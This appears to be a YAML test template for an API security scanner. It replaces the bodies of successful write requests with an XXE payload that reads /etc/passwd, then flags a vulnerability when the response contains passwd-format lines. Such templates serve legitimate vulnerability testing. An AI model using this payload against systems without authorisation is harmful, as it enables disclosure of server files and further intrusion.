api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  request_headers:
    for_one:
      key:
        contains_either:
          - content-type
          - Content-Type
        extract: headerKey
  method:
    contains_either:
      - POST
      - PUT
      - PATCH
wordLists:
  payloads:
    - "<!DOCTYPE test [<!ENTITY % param \"<!ENTITY xxe SYSTEM 'file:///etc/passwd'>\">%param;]>"
execute:
  type: single
  requests:
    - req:
        - replace_body: ${payloads}
        - modify_header:
            ${headerKey}: "application/xml"
validate:
  response_payload:
    regex: "^([^:]+):([^:]*):(\\d+):(\\d+):([^:]*):([^:]*):([^:\\n\\r]*)$"
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
